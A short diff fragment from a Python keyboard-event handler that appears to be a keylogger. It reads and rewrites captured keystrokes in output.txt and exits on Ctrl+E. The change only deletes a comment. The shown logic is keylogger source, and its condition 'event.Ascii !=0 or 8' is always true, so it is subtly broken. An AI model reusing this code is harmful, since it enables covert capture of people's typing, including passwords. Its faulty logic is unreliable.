@@ -9,7 +9,6 @@ def OnKeyboardEvent(event):
     if event.Ascii==5: 
         sys.exit(1)
     if event.Ascii !=0 or 8: 
-    #open output.txt to read current keystrokes 
         f = open(os.getcwd()+'\output.txt', 'r+') 
         buffer = f.read()
         f.truncate()
